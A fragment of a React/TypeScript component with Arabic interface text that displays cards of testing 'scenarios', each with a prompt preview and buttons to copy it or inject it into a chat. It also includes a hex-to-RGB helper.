                        {isHovered && (
                          <div
                            className="absolute inset-0 pointer-events-none rounded-xl overflow-hidden"
                            style={{ zIndex: 1 }}
                          >
                            <div style={{
                              position: "absolute", inset: 0,
                              background: `linear-gradient(108deg, transparent 30%, ${color}14 50%, transparent 70%)`,
                              backgroundSize: "200% 100%",
                              animation: "shimmer-scan 2s linear infinite",
                            }} />
                          </div>
                        )}

                        {/* Multi-corner glows on hover */}
                        {isHovered && (
                          <>
                            <div className="absolute top-0 right-0 w-28 h-28 pointer-events-none"
                              style={{ background: `radial-gradient(circle at top right, ${color}22, transparent 70%)` }} />
                            <div className="absolute bottom-0 left-0 w-20 h-20 pointer-events-none"
                              style={{ background: `radial-gradient(circle at bottom left, ${color}15, transparent 70%)` }} />
                          </>
                        )}

                        {/* Card Top Bar */}
                        <div
                          className="h-0.5 w-full"
                          style={{ background: isHovered ? `linear-gradient(90deg, transparent, ${color}, transparent)` : "transparent", transition: "all 0.3s" }}
                        />

                        <div className="p-4">
                          {/* Header row */}
                          <div className="flex items-start justify-between mb-3">
                            <div className="flex items-center gap-2.5">
                              {/* 3D icon box */}
                              <div
                                className="w-9 h-9 rounded-lg flex items-center justify-center shrink-0 relative"
                                style={{
                                  background: `linear-gradient(135deg, ${color}25, ${color}10)`,
                                  border: `1px solid ${color}30`,
                                  boxShadow: isHovered ? `0 0 15px ${color}30` : "none",
                                  transition: "all 0.3s",
                                }}
                              >
                                <Icon className="w-4 h-4" style={{ color }} />
                              </div>
                              <div>
                                <div className="text-[11px] font-mono font-bold uppercase" style={{ color }}>{uc.category}</div>
                                <div className="text-sm font-semibold text-white leading-tight">{uc.title}</div>
                              </div>
                            </div>
                            <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border shrink-0 ${DIFFICULTIES[uc.difficulty]}`}>
                              {uc.difficulty}
                            </span>
                          </div>

                          {/* Description */}
                          <p className="text-[12px] text-muted-foreground leading-relaxed mb-3">{uc.description}</p>

                          {/* Tags */}
                          <div className="flex flex-wrap gap-1 mb-3">
                            {uc.tags.map((tag) => (
                              <span
                                key={tag}
                                className="text-[9px] font-mono px-1.5 py-0.5 rounded"
                                style={{ background: "rgba(255,255,255,0.05)", color: "#666", border: "1px solid rgba(255,255,255,0.07)" }}
                              >
                                {tag}
                              </span>
                            ))}
                          </div>

                          {/* Expanded prompt preview */}
                          <AnimatePresence>
                            {isExpanded && (
                              <motion.div
                                initial={{ opacity: 0, height: 0 }}
                                animate={{ opacity: 1, height: "auto" }}
                                exit={{ opacity: 0, height: 0 }}
                                className="mb-3 overflow-hidden"
                              >
                                <div
                                  className="rounded-lg p-3 text-[11px] font-mono text-green-400/80 leading-relaxed whitespace-pre-wrap overflow-x-auto"
                                  style={{ background: "rgba(0,0,0,0.6)", border: "1px solid rgba(0,255,65,0.1)", maxHeight: "200px", overflowY: "auto" }}
                                >
                                  {uc.prompt}
                                </div>
                              </motion.div>
                            )}
                          </AnimatePresence>

                          {/* Actions */}
                          <div className="flex items-center gap-2">
                            <button
                              onClick={(e) => { e.stopPropagation(); handleInject(uc.prompt); }}
                              className="flex-1 flex items-center justify-center gap-1.5 py-1.5 rounded-lg text-[11px] font-mono font-bold text-white transition-all duration-200"
                              style={{
                                background: `linear-gradient(135deg, ${color}cc, ${color}80)`,
                                boxShadow: isHovered ? `0 0 15px ${color}40` : "none",
                              }}
                            >
                              <Zap className="w-3 h-3" />
                              حقن في المحادثة
                            </button>
                            <button
                              onClick={(e) => { e.stopPropagation(); handleCopy(uc.id, uc.prompt); }}
                              className="w-8 h-8 flex items-center justify-center rounded-lg transition-all duration-200 shrink-0"
                              style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)" }}
                            >
                              {copied === uc.id ? (
                                <Check className="w-3.5 h-3.5 text-green-400" />
                              ) : (
                                <Copy className="w-3.5 h-3.5 text-muted-foreground" />
                              )}
                            </button>
                            <button
                              onClick={(e) => { e.stopPropagation(); setExpanded(isExpanded ? null : uc.id); }}
                              className="w-8 h-8 flex items-center justify-center rounded-lg transition-all duration-200 shrink-0"
                              style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)" }}
                            >
                              <ChevronRight
                                className="w-3.5 h-3.5 text-muted-foreground transition-transform duration-200"
                                style={{ transform: isExpanded ? "rotate(90deg)" : "rotate(0)" }}
                              />
                            </button>
                          </div>
                        </div>
                      </div>
                    </motion.div>
                  );
                })}
              </AnimatePresence>
            </div>

            {filtered.length === 0 && (
              <div className="flex flex-col items-center justify-center py-20 text-center">
                <Search className="w-10 h-10 text-muted-foreground/30 mb-3" />
                <p className="text-muted-foreground font-mono text-sm">لا توجد سيناريوهات مطابقة</p>
                <button
                  onClick={() => { setSearch(""); setCategory("ALL"); }}
                  className="mt-3 text-[11px] text-red-400 hover:underline font-mono"
                >
                  مسح الفلاتر
                </button>
              </div>
            )}
          </div>

          {/* Footer */}
          <div className="relative z-10 flex items-center justify-between px-6 py-3 border-t border-white/5" style={{ background: "rgba(0,0,0,0.5)" }}>
            <div className="flex items-center gap-3">
              <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
              <span className="text-[10px] font-mono text-muted-foreground">كل السيناريوهات مصممة للاختبار المخول فقط</span>
            </div>
            <div className="flex items-center gap-2 text-[10px] font-mono text-muted-foreground">
              <span>اضغط على البطاقة للمعاينة</span>
              <ChevronRight className="w-3 h-3" />
              <span className="text-red-400">حقن فوري في المحادثة</span>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}

function hexToRgb(hex: string): string {
  const r = parseInt(hex.slice(1, 3), 16);
  const g = parseInt(hex.slice(3, 5), 16);
  const b = parseInt(hex.slice(5, 7), 16);
  return `${r},${g},${b}`;
}
